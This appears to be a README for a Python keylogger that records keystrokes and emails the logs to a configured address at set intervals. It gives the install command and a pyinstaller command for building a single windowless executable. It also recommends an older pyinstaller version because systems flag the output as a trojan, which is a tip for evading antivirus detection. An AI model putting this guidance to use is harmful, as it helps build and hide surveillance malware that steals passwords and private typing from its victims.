# keylogger
Prior to script running, we need to install keyboard module (pip install keyboard). \
To package as a 1 file exe application, pip install pyinstaller and run 
```
pyinstaller -F -w keylogger.py
```
Packaged application will be contained within the generated dist folder. You may need to install older version of pyinstaller as some systems flag the generated application as a trojan (https://stackoverflow.com/questions/77239487/win32ctypes-pywin32-pywintypes-error-when-using-pyinstaller-in-vs-code-possib). \
Sends key log data to email endpoint.
Send the log report to an email for every REPORT_FREQUENCY (measured in seconds) interval
For gmail, EMAIL_PASSWORD field must be a generated app password.
